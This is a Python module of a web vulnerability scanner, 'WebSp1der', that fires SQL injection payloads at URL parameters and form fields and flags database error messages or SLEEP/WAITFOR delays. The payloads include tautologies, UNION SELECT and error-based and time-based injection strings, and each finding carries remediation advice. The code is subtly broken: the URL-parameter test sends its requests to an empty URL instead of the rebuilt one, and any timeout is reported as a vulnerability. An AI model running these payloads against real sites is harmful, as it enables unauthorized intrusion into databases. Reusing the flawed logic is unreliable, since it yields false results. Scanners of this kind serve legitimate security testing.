#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebSp1der - Scanner de SQL Injection
Desenvolvido por: mairinkdev (https://github.com/mairinkdev)
"""

import logging
import re
import time
import requests
from urllib.parse import urljoin, parse_qs, urlparse, urlencode
from ..utils import Utils

logger = logging.getLogger('websp1der.scanners.sqli')

class SQLIScanner:
    """Scanner para detecção de vulnerabilidades de SQL Injection."""
    
    def __init__(self):
        """Inicializa o scanner de SQL Injection."""
        self.name = "SQL Injection Scanner"
        self.description = "Scanner para detecção de vulnerabilidades de SQL Injection"
        
        # Payloads para teste de SQL Injection
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\" --",
            "\" OR \"1\"=\"1\" /*",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "' OR '1'='1' UNION SELECT 1,2,3 --",
            "1; SELECT 1,2,3 --",
            "1' AND (SELECT 4949 FROM(SELECT COUNT(*),CONCAT(0x7176707a71,(SELECT (ELT(4949=4949,1))),0x716a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '1'='1",
            "1' AND SLEEP(3) AND '1'='1",
            "1\" AND SLEEP(3) AND \"1\"=\"1"
        ]
        
        # Padrões para detectar mensagens de erro de banco de dados
        self.error_patterns = [
            # MySQL
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"MySqlException",
            r"MySQLSyntaxErrorException",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            
            # Microsoft SQL Server
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
            r"(?s)Exception.*\WRoadhouse\.Cms\.",
            r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
            r"com\.microsoft\.sqlserver\.jdbc\.SQLServerException",
            
            # Oracle
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*",
            r"oracle\.jdbc\.driver",
            
            # SQLite
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            
            # Genéricos
            r"SQL syntax.*",
            r"syntax error\s*near",
            r"incorrect syntax near",
            r"unexpected end of SQL command",
            r"Warning.*SQL",
            r"SQL command not properly ended",
            r"ERROR:\s*syntax error",
            r"FATAL:\s*",
            r"sqlite3\.OperationalError:",
            r"Unclosed quotation mark after the character string",
            r"DB2 SQL error:",
            r"ODBC SQL error:",
            r"Sybase message:"
        ]
        
        # Time delay em segundos para testar injeção baseada em tempo
        self.time_delay = 3
    
    def detect_error_based(self, response_text):
        """
        Detecta mensagens de erro de banco de dados na resposta.
        
        Args:
            response_text (str): Texto da resposta HTTP
            
        Returns:
            bool: True se foi detectada mensagem de erro, False caso contrário
        """
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def detect_time_based(self, url, params, param_name, proxies=None, headers=None):
        """
        Detecta vulnerabilidades baseadas em tempo (time-based blind SQL injection).
        
        Args:
            url (str): URL para testar
            params (dict): Parâmetros da requisição
            param_name (str): Nome do parâmetro a testar
            proxies (dict, opcional): Configuração de proxy
            headers (dict, opcional): Cabeçalhos HTTP
            
        Returns:
            bool: True se foi detectada injeção baseada em tempo, False caso contrário
        """
        # Criar payloads específicos para injeção baseada em tempo
        time_payloads = [
            f"' AND SLEEP({self.time_delay}) --",
            f"\" AND SLEEP({self.time_delay}) --",
            f"' AND (SELECT {self.time_delay} FROM DUAL) --",
            f"\" AND (SELECT {self.time_delay} FROM DUAL) --",
            f"1; WAITFOR DELAY '0:0:{self.time_delay}' --"
        ]
        
        for payload in time_payloads:
            # Fazer uma cópia dos parâmetros e modificar o valor do parâmetro atual
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                start_time = time.time()
                
                response = requests.get(
                    url,
                    params=test_params,
                    headers=headers,
                    proxies=proxies,
                    timeout=self.time_delay + 5,  # Timeout um pouco maior que o delay
                    verify=False  # Desabilitar verificação SSL para testes
                )
                
                execution_time = time.time() - start_time
                
                # Se o tempo de execução for próximo ou maior que o delay configurado
                if execution_time >= self.time_delay:
                    return True
                    
            except requests.Timeout:
                # Um timeout também pode indicar uma injeção bem-sucedida
                return True
            except requests.RequestException:
                continue
                
        return False
    
    def test_url_params(self, url, proxies=None, headers=None):
        """
        Testa parâmetros da URL para vulnerabilidades de SQL Injection.
        
        Args:
            url (str): URL para testar
            proxies (dict, opcional): Configuração de proxy
            headers (dict, opcional): Cabeçalhos HTTP
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        vulnerabilities = []
        
        # Verificar se a URL tem parâmetros
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return vulnerabilities
        
        logger.debug(f"Testando parâmetros da URL para SQL Injection: {url}")
        
        # Testar cada parâmetro com cada payload
        for param_name, param_values in query_params.items():
            # Testar injeção baseada em erro
            for payload in self.payloads:
                # Criar uma cópia dos parâmetros e modificar o valor do parâmetro atual
                test_params = query_params.copy()
                test_params[param_name] = [payload]
                
                # Reconstruir a URL com o novo parâmetro
                test_url_parts = list(parsed_url)
                test_url_parts[4] = urlencode(test_params, doseq=True)
                test_url = urlparse('').geturl()
                
                try:
                    response = requests.get(
                        test_url,
                        headers=headers,
                        proxies=proxies,
                        timeout=10,
                        verify=False  # Desabilitar verificação SSL para testes
                    )
                    
                    # Verificar se há mensagens de erro de SQL na resposta
                    if self.detect_error_based(response.text):
                        vulnerability = {
                            'type': 'sql_injection',
                            'name': 'SQL Injection',
                            'severity': 'critical',
                            'location': f"{url} (parâmetro: {param_name})",
                            'description': f"O parâmetro '{param_name}' é vulnerável a ataques de injeção SQL.",
                            'evidence': f"Payload usado: {payload}\nDetectadas mensagens de erro de SQL na resposta.",
                            'cwe_id': 'CWE-89',
                            'remediation': """
                            1. Use consultas parametrizadas ou prepared statements.
                            2. Utilize ORM (Object-Relational Mapping) quando possível.
                            3. Valide e sanitize todas as entradas de usuário.
                            4. Implemente o princípio do privilégio mínimo no banco de dados.
                            5. Configure corretamente as mensagens de erro para não vazarem informações sensíveis.
                            """
                        }
                        vulnerabilities.append(vulnerability)
                        break  # Pular para o próximo parâmetro após encontrar vulnerabilidade
                        
                except requests.RequestException as e:
                    logger.error(f"Erro ao testar SQL Injection em {test_url}: {str(e)}")
                    continue
            
            # Se não encontrou vulnerabilidade baseada em erro, tentar baseada em tempo
            if not any(vuln['location'].endswith(f"parâmetro: {param_name})") for vuln in vulnerabilities):
                flat_params = {k: v[0] if isinstance(v, list) and len(v) > 0 else v for k, v in query_params.items()}
                
                if self.detect_time_based(url, flat_params, param_name, proxies, headers):
                    vulnerability = {
                        'type': 'sql_injection',
                        'name': 'Blind SQL Injection (Time-based)',
                        'severity': 'critical',
                        'location': f"{url} (parâmetro: {param_name})",
                        'description': f"O parâmetro '{param_name}' é vulnerável a ataques de injeção SQL baseada em tempo.",
                        'evidence': f"Detectado atraso na resposta ao utilizar payload de injeção SQL com time delay.",
                        'cwe_id': 'CWE-89',
                        'remediation': """
                        1. Use consultas parametrizadas ou prepared statements.
                        2. Utilize ORM (Object-Relational Mapping) quando possível.
                        3. Valide e sanitize todas as entradas de usuário.
                        4. Implemente o princípio do privilégio mínimo no banco de dados.
                        5. Implemente limites de tempo para consultas ao banco de dados.
                        """
                    }
                    vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    def test_form(self, form, proxies=None, headers=None):
        """
        Testa formulários para vulnerabilidades de SQL Injection.
        
        Args:
            form (dict): Informações do formulário
            proxies (dict, opcional): Configuração de proxy
            headers (dict, opcional): Cabeçalhos HTTP
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        vulnerabilities = []
        
        form_url = form.get('url', '')
        form_action = form.get('action', '')
        form_method = form.get('method', 'get').lower()
        form_inputs = form.get('inputs', [])
        
        if not form_url or not form_inputs:
            return vulnerabilities
        
        # Resolver URL completa da ação do formulário
        if form_action:
            action_url = urljoin(form_url, form_action)
        else:
            action_url = form_url
        
        logger.debug(f"Testando formulário para SQL Injection: {action_url}")
        
        # Testar cada campo de entrada com cada payload
        for input_field in form_inputs:
            field_name = input_field.get('name', '')
            field_type = input_field.get('type', '').lower()
            
            # Ignorar campos ocultos, senhas, arquivos, etc.
            if not field_name or field_type in ['hidden', 'password', 'file', 'submit', 'button']:
                continue
            
            # Testar injeção baseada em erro
            for payload in self.payloads:
                # Preparar dados do formulário
                form_data = {}
                
                # Preencher todos os campos com valores simulados
                for input_item in form_inputs:
                    item_name = input_item.get('name', '')
                    item_type = input_item.get('type', '').lower()
                    
                    if not item_name:
                        continue
                    
                    if item_name == field_name:
                        form_data[item_name] = payload
                    else:
                        # Preencher outros campos com valores padrão
                        if item_type == 'email':
                            form_data[item_name] = 'test@example.com'
                        elif item_type == 'number':
                            form_data[item_name] = '123'
                        elif item_type in ['checkbox', 'radio']:
                            form_data[item_name] = 'on'
                        else:
                            form_data[item_name] = 'test'
                
                try:
                    # Enviar o formulário
                    if form_method == 'post':
                        response = requests.post(
                            action_url,
                            data=form_data,
                            headers=headers,
                            proxies=proxies,
                            timeout=10,
                            verify=False  # Desabilitar verificação SSL para testes
                        )
                    else:  # GET
                        response = requests.get(
                            action_url,
                            params=form_data,
                            headers=headers,
                            proxies=proxies,
                            timeout=10,
                            verify=False  # Desabilitar verificação SSL para testes
                        )
                    
                    # Verificar se há mensagens de erro de SQL na resposta
                    if self.detect_error_based(response.text):
                        vulnerability = {
                            'type': 'sql_injection',
                            'name': 'SQL Injection',
                            'severity': 'critical',
                            'location': f"Formulário em {form_url} (campo: {field_name})",
                            'description': f"O campo '{field_name}' do formulário é vulnerável a ataques de injeção SQL.",
                            'evidence': f"Payload usado: {payload}\nDetectadas mensagens de erro de SQL na resposta.",
                            'cwe_id': 'CWE-89',
                            'remediation': """
                            1. Use consultas parametrizadas ou prepared statements.
                            2. Utilize ORM (Object-Relational Mapping) quando possível.
                            3. Valide e sanitize todas as entradas de usuário.
                            4. Implemente o princípio do privilégio mínimo no banco de dados.
                            5. Configure corretamente as mensagens de erro para não vazarem informações sensíveis.
                            """
                        }
                        vulnerabilities.append(vulnerability)
                        break  # Pular para o próximo campo após encontrar vulnerabilidade
                        
                except requests.RequestException as e:
                    logger.error(f"Erro ao testar SQL Injection em formulário {action_url}: {str(e)}")
                    continue
            
            # Se não encontrou vulnerabilidade baseada em erro, tentar baseada em tempo
            if not any(vuln['location'].endswith(f"campo: {field_name})") for vuln in vulnerabilities):
                # Preparar dados do formulário para o teste baseado em tempo
                base_form_data = {}
                
                # Preencher todos os campos com valores simulados
                for input_item in form_inputs:
                    item_name = input_item.get('name', '')
                    item_type = input_item.get('type', '').lower()
                    
                    if not item_name:
                        continue
                    
                    # Preencher campos com valores padrão para o teste de tempo
                    if item_type == 'email':
                        base_form_data[item_name] = 'test@example.com'
                    elif item_type == 'number':
                        base_form_data[item_name] = '123'
                    elif item_type in ['checkbox', 'radio']:
                        base_form_data[item_name] = 'on'
                    else:
                        base_form_data[item_name] = 'test'
                
                # Testar injeção baseada em tempo
                time_payloads = [
                    f"' AND SLEEP({self.time_delay}) --",
                    f"\" AND SLEEP({self.time_delay}) --",
                    f"1; WAITFOR DELAY '0:0:{self.time_delay}' --"
                ]
                
                for time_payload in time_payloads:
                    test_form_data = base_form_data.copy()
                    test_form_data[field_name] = time_payload
                    
                    try:
                        start_time = time.time()
                        
                        # Enviar o formulário
                        if form_method == 'post':
                            response = requests.post(
                                action_url,
                                data=test_form_data,
                                headers=headers,
                                proxies=proxies,
                                timeout=self.time_delay + 5,  # Timeout um pouco maior que o delay
                                verify=False  # Desabilitar verificação SSL para testes
                            )
                        else:  # GET
                            response = requests.get(
                                action_url,
                                params=test_form_data,
                                headers=headers,
                                proxies=proxies,
                                timeout=self.time_delay + 5,  # Timeout um pouco maior que o delay
                                verify=False  # Desabilitar verificação SSL para testes
                            )
                        
                        execution_time = time.time() - start_time
                        
                        # Se o tempo de execução for próximo ou maior que o delay configurado
                        if execution_time >= self.time_delay:
                            vulnerability = {
                                'type': 'sql_injection',
                                'name': 'Blind SQL Injection (Time-based)',
                                'severity': 'critical',
                                'location': f"Formulário em {form_url} (campo: {field_name})",
                                'description': f"O campo '{field_name}' do formulário é vulnerável a ataques de injeção SQL baseada em tempo.",
                                'evidence': f"Payload usado: {time_payload}\nDetectado atraso na resposta ao utilizar payload de injeção SQL com time delay.",
                                'cwe_id': 'CWE-89',
                                'remediation': """
                                1. Use consultas parametrizadas ou prepared statements.
                                2. Utilize ORM (Object-Relational Mapping) quando possível.
                                3. Valide e sanitize todas as entradas de usuário.
                                4. Implemente o princípio do privilégio mínimo no banco de dados.
                                5. Implemente limites de tempo para consultas ao banco de dados.
                                """
                            }
                            vulnerabilities.append(vulnerability)
                            break  # Pular para o próximo campo após encontrar vulnerabilidade
                            
                    except requests.Timeout:
                        # Um timeout também pode indicar uma injeção bem-sucedida
                        vulnerability = {
                            'type': 'sql_injection',
                            'name': 'Blind SQL Injection (Time-based)',
                            'severity': 'critical',
                            'location': f"Formulário em {form_url} (campo: {field_name})",
                            'description': f"O campo '{field_name}' do formulário é potencialmente vulnerável a ataques de injeção SQL baseada em tempo.",
                            'evidence': f"Payload usado: {time_payload}\nA requisição atingiu o timeout ao utilizar payload de injeção SQL com time delay.",
                            'cwe_id': 'CWE-89',
                            'remediation': """
                            1. Use consultas parametrizadas ou prepared statements.
                            2. Utilize ORM (Object-Relational Mapping) quando possível.
                            3. Valide e sanitize todas as entradas de usuário.
                            4. Implemente o princípio do privilégio mínimo no banco de dados.
                            5. Implemente limites de tempo para consultas ao banco de dados.
                            """
                        }
                        vulnerabilities.append(vulnerability)
                        break  # Pular para o próximo campo após encontrar vulnerabilidade
                    except requests.RequestException:
                        continue
        
        return vulnerabilities
    
    def scan(self, urls, forms, proxies=None, headers=None):
        """
        Executa o escaneamento de SQL Injection em URLs e formulários.
        
        Args:
            urls (list): Lista de URLs para analisar
            forms (list): Lista de formulários para analisar
            proxies (dict, opcional): Configuração de proxy
            headers (dict, opcional): Cabeçalhos HTTP
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        vulnerabilities = []
        
        logger.info("Iniciando escaneamento de SQL Injection...")
        
        # Testar URLs
        for url in urls:
            url_vulns = self.test_url_params(url, proxies, headers)
            vulnerabilities.extend(url_vulns)
        
        # Testar formulários
        for form in forms:
            form_vulns = self.test_form(form, proxies, headers)
            vulnerabilities.extend(form_vulns)
        
        logger.info(f"Escaneamento de SQL Injection concluído. Encontradas {len(vulnerabilities)} vulnerabilidades.")
        
        return vulnerabilities 